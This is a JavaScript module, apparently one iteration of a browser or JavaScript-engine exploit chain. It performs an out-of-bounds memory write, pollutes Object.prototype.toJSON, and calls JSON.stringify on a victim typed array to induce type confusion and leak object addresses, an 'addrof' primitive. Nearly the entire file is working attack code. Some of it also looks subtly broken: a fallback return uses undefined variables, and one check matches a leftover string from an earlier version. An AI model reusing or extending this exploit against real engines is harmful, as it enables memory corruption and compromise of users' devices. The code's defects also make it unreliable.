// js/script3/testArrayBufferVictimCrash.mjs (v86a_FixRef_And_FocusM2)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V86A_FRFAM2 = "OriginalHeisenbug_TypedArrayAddrof_v86a_FixRefAndFocusM2";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUES_V86A = [0xFFFFFFFF, 0x7FFFFFFF]; 

// Variáveis globais para o módulo de teste v86a
let object_to_leak_A_v86a = null;
let object_to_leak_B_v86a = null;
let victim_typed_array_ref_v86a = null; 
let probe_call_count_v86a = 0;
let marker_M1_ref_v86a = null; 
let marker_M2_ref_v86a = null; 
// Armazena os detalhes da chamada da sonda onde M2 foi 'this' e (esperançosamente) confuso e modificado.
let details_of_M2_interaction_v86a = null; 
const PROBE_CALL_LIMIT_V86A = 7; 
const FILL_PATTERN_V86A_SCRATCHPAD = 0.86868686868686;


function toJSON_TA_Probe_V86a_FocusM2() {
    probe_call_count_v86a++;
    const call_num = probe_call_count_v86a;
    let current_call_log_info = { 
        call_number: call_num,
        probe_variant: "TA_Probe_V86a_FocusM2",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v86a),
        this_is_M1: (this === marker_M1_ref_v86a && marker_M1_ref_v86a !== null),
        this_is_M2: (this === marker_M2_ref_v86a && marker_M2_ref_v86a !== null),
        m2_interaction_summary: null, 
        error_in_probe: null
    };
    // A variável details_of_M2_interaction_v86a será atualizada especificamente quando 'this' for M2.
    logS3(`[PROBE_V86a] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");
    
    try {
        if (call_num > PROBE_CALL_LIMIT_V86A) {
            logS3(`[PROBE_V86a] Call #${call_num}: Probe limit. Stop.`, "warn");
            // Se o limite for atingido e M2 ainda não foi processado, registra os detalhes atuais.
            if (!details_of_M2_interaction_v86a && marker_M2_ref_v86a === null) { // Garante que não sobrescreva uma interação M2 válida.
                 details_of_M2_interaction_v86a = current_call_log_info;
            }
            return { recursion_stopped_v86a: true };
        }

        if (call_num === 1 && current_call_log_info.this_is_victim) {
            logS3(`[PROBE_V86a] Call #${call_num}: 'this' is victim. Returning M1 (contains M2).`, "info");
            marker_M2_ref_v86a = { marker_id_v86a: "M2_V86a_Target" }; 
            marker_M1_ref_v86a = { marker_id_v86a: "M1_V86a_Container", payload_M2: marker_M2_ref_v86a };
            // Não definir details_of_M2_interaction_v86a aqui, esperar a chamada com M2 como 'this'
            return marker_M1_ref_v86a;
        } else if (call_num >= 2 && current_call_log_info.this_is_M2) { // 'this' é M2
            logS3(`[PROBE_V86a] Call #${call_num}: 'this' IS M2. Current type: ${current_call_log_info.this_type}. Checking for TC...`, "critical");
            current_call_log_info.m2_interaction_summary = { getter_defined: false, direct_prop_set: false, keys_after: "N/A" };
            
            if (current_call_log_info.this_type === '[object Object]') { 
                logS3(`[PROBE_V86a] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! ID: ${this.marker_id_v86a}. Defining getter & prop...`, "vuln");
                
                Object.defineProperty(this, 'leaky_A_getter_v86a', {
                    get: function() {
                        logS3(`[PROBE_V86a] !!! Getter 'leaky_A_getter_v86a' on confused M2 (call #${call_num}) FIRED !!!`, "vuln");
                        if (!victim_typed_array_ref_v86a || !victim_typed_array_ref_v86a.buffer) {
                            current_call_log_info.error_in_probe = (current_call_log_info.error_in_probe || "") + "Getter: victim_buffer_null; ";
                            return "getter_victim_null_err_v86a";
                        }
                        let victim_view = new Float64Array(victim_typed_array_ref_v86a.buffer);
                        let victim_u32_view = new Uint32Array(victim_typed_array_ref_v86a.buffer);
                        const original_victim_val_idx0 = victim_view[0]; 
                        victim_view[0] = object_to_leak_A_v86a; 
                        let val_after_assign = victim_view[0];
                        let temp_buf_for_advint = new ArrayBuffer(8); new Float64Array(temp_buf_for_advint)[0] = val_after_assign;
                        let int64_after_assign = new AdvancedInt64(new Uint32Array(temp_buf_for_advint)[0], new Uint32Array(temp_buf_for_advint)[1]);
                        logS3(`[PROBE_V86a] Getter: VictimView[0] after objA assign: ${val_after_assign} (Int64: ${int64_after_assign.toString(true)})`, "leak");
                        victim_view[0] = original_victim_val_idx0; 
                        return val_after_assign; 
                    }, enumerable: true, configurable: true
                });
                current_call_log_info.m2_interaction_summary.getter_defined = true;
                
                this.leaky_B_direct_v86a = object_to_leak_B_v86a;
                current_call_log_info.m2_interaction_summary.direct_prop_set = true;
                try{ current_call_log_info.m2_interaction_summary.keys_after = Object.keys(this).join(','); } catch(e){}
                logS3(`[PROBE_V86a] Call #${call_num}: Getter and prop set on M2 ('this'). Keys: ${current_call_log_info.m2_interaction_summary.keys_after}`, "info");
            } else {
                 logS3(`[PROBE_V86a] Call #${call_num}: M2 ('this') was NOT [object Object]. Type: ${current_call_log_info.this_type}`, "warn");
            }
            details_of_M2_interaction_v86a = current_call_log_info; // Captura os detalhes desta interação com M2
            return this; // Retorna M2 (potencialmente modificado)
        } else if (this === object_to_leak_A_v86a || this === object_to_leak_B_v86a) {
            logS3(`[PROBE_V86a] Call #${call_num}: 'this' is one of the leak_target objects. Returning simple marker.`, "info");
            // Não sobrescrever details_of_M2_interaction_v86a aqui
            return { serializing_leaked_object_marker_v86a: call_num };
        }
    } catch (e) { current_call_log_info.error_in_probe = e.message; }
    
    // Se M2 não foi processado ainda, e esta não é a chamada de M2, atualizar com os detalhes atuais.
    if (!details_of_M2_interaction_v86a?.this_is_M2) {
        details_of_M2_interaction_v86a = current_call_log_info;
    }
    return { generic_marker_v86a: call_num }; 
}

export async function executeTypedArrayVictimAddrofTest_FixRef_And_FocusM2() { // Nome da função atualizado
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V86A_FRFAM2}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (FixRef_And_FocusM2) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V86A_FRFAM2} Init...`;

    let overall_results = [];
    let errorCapturedDuringExecute = null; // Para erros no nível do execute...

    for (const current_oob_value of OOB_WRITE_VALUES_V86A) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        probe_call_count_v86a = 0;
        victim_typed_array_ref_v86a = null; 
        marker_M1_ref_v86a = null;
        marker_M2_ref_v86a = null;
        details_of_M2_interaction_v86a = null; // Reset para cada iteração
        object_to_leak_A_v86a = { marker_A_v86a: `LeakA_Val${toHex(current_oob_value)}`}; 
        object_to_leak_B_v86a = { marker_B_v86a: `LeakB_Val${toHex(current_oob_value)}`};

        let iterError = null;
        let stringifyOutput_parsed_iter = null; 
        
        let addrof_M2_Getter_iter = { success: false, msg: "M2.leaky_A_getter: Default"};
        let addrof_M2_Direct_iter = { success: false, msg: "M2.leaky_B_direct: Default"};
        
        try {
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write done for iter Val${toHex(current_oob_value)}.`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);
            victim_typed_array_ref_v86a = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            new Float64Array(victim_typed_array_ref_v86a.buffer).fill(FILL_PATTERN_V86A_SCRATCHPAD);
            logS3(`STEP 2: victim_typed_array_ref_v86a created.`, "test", FNAME_CURRENT_ITERATION);
            
            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_V86a_FocusM2, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v86a); 
                logS3(`  JSON.stringify iter Val${toHex(current_oob_value)} completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
                try { stringifyOutput_parsed_iter = JSON.parse(rawStringifyOutput); } 
                catch (e_parse) { stringifyOutput_parsed_iter = { error_parsing: e_parse.message, raw: rawStringifyOutput }; }
                
                // details_of_M2_interaction_v86a deve ter sido definido pela Call #2 da sonda, se tudo correu bem
                logS3(`  EXECUTE (Iter): Details of M2 interaction call: ${details_of_M2_interaction_v86a ? JSON.stringify(details_of_M2_interaction_v86a) : 'N/A (M2 not reached as this or error)'}`, "leak", FNAME_CURRENT_ITERATION);

                let heisenbugOnM2 = details_of_M2_interaction_v86a?.this_is_M2 && details_of_M2_interaction_v86a?.this_type === "[object Object]";
                logS3(`  EXECUTE (Iter): Heisenbug on M2 Target ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_ITERATION);
                    
                let m2_payload_from_stringify = null;
                if (stringifyOutput_parsed_iter?.marker_id_v86a === "M1_V86a_Container" && stringifyOutput_parsed_iter.payload_M2) {
                    m2_payload_from_stringify = stringifyOutput_parsed_iter.payload_M2; 
                } else if (stringifyOutput_parsed_iter?.marker_id_v86a === "M2_V86a_Target") {
                    m2_payload_from_stringify = stringifyOutput_parsed_iter; 
                }

                if (m2_payload_from_stringify?.marker_id_v86a === "M2_V86a_Target") {
                    const val_getter = m2_payload_from_stringify.leaky_A_getter_v86a; 
                    if (typeof val_getter === 'number' && !isNaN(val_getter) && val_getter !== 0 && val_getter !== FILL_PATTERN_V86A_SCRATCHPAD && val_getter !== "getter_no_addr_v82" && val_getter !== "getter_victim_null_err_v86a") { // Checagem mais robusta
                        let temp_buf_getter = new ArrayBuffer(8); new Float64Array(temp_buf_getter)[0] = val_getter;
                        let getter_int64 = new AdvancedInt64(new Uint32Array(temp_buf_getter)[0], new Uint32Array(temp_buf_getter)[1]);
                        if ((getter_int64.high() > 0 && getter_int64.high() < 0x000F0000) || ((getter_int64.high() & 0xFFFF0000) === 0xFFFF0000  && getter_int64.high() !== 0xFFFFFFFF ) ) {
                           addrof_M2_Getter_iter.success = true; addrof_M2_Getter_iter.msg = `Possible pointer from getter: ${getter_int64.toString(true)} (Val: ${val_getter})`;
                        } else { addrof_M2_Getter_iter.msg = `Getter value is num but not ptr: ${val_getter} (${getter_int64.toString(true)})`; }
                    } else { addrof_M2_Getter_iter.msg = `Getter value not useful num. Val: ${JSON.stringify(val_getter)}`; }

                    const val_direct = m2_payload_from_stringify.leaky_B_direct_v86a;
                    if (val_direct && val_direct.marker_B_v86a === object_to_leak_B_v86a.marker_B_v86a) {
                         addrof_M2_Direct_iter.success = true; addrof_M2_Direct_iter.msg = "object_to_leak_B_v86a identity from M2.leaky_B_direct.";
                    } else { addrof_M2_Direct_iter.msg = `Direct prop val not objB identity. Val: ${JSON.stringify(val_direct)}`; }
                } else { /* M2 não encontrado como esperado */ }

            } catch (e_str) { iterError = e_str;
            } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null }); }
        } catch (e_outer) { iterError = e_outer;
        } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
        
        overall_results.push({
            oob_value: toHex(current_oob_value), error: iterError ? `${iterError.name}: ${iterError.message}` : null,
            m2_probe_log_details_iter: details_of_M2_interaction_v86a ? JSON.parse(JSON.stringify(details_of_M2_interaction_v86a)) : null, 
            final_stringify_output_parsed_iter: stringifyOutput_parsed_iter,
            addrof_M2_Getter: {...addrof_M2_Getter_iter}, addrof_M2_Direct: {...addrof_M2_Direct_iter},
            probe_calls_this_iter: probe_call_count_v86a
        });
        if (addrof_M2_Getter_iter.success || addrof_M2_Direct_iter.success) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V86A_FRFAM2}: Addr? Val${toHex(current_oob_value)} SUCCESS!`;
        }
        await PAUSE_S3(100); 
    } 

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    let iter_summary_for_log = overall_results.map(r => ({ov:r.oob_value, gS:r.addrof_M2_Getter.success, dS:r.addrof_M2_Direct.success, m2tc:(r.m2_probe_log_details_iter?.this_is_M2 && r.m2_probe_log_details_iter?.this_type==='[object Object]'), calls:r.probe_calls_this_iter, err:r.error}));
    logS3(`Summary: ${JSON.stringify(iter_summary_for_log)}`, "info", FNAME_CURRENT_TEST_BASE);
    
    if (!document.title.includes("SUCCESS")) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V86A_FRFAM2}: All Vals Tested.`;
    
    let result_for_runner = overall_results.find(r => r.addrof_M2_Getter.success || r.addrof_M2_Direct.success);
    if (!result_for_runner && overall_results.length > 0) result_for_runner = overall_results[overall_results.length - 1];
    
    return { 
        errorOccurred: errorCapturedDuringExecute, // Corrigido para usar a variável correta
        iteration_results_summary: iter_summary_for_log,
        toJSON_details: result_for_runner ? result_for_runner.m2_probe_log_details_iter : null, 
        stringifyResult: result_for_runner ? result_for_runner.final_stringify_output_parsed_iter : null,
        addrof_A_result: result_for_runner ? result_for_runner.addrof_M2_Getter : addrof_M2_Getter, 
        addrof_B_result: result_for_runner ? result_for_runner.addrof_M2_Direct : addrof_M2_Direct,  
        total_probe_calls: result_for_runner ? result_for_runner.probe_calls_this_iter : 0 
    };
}
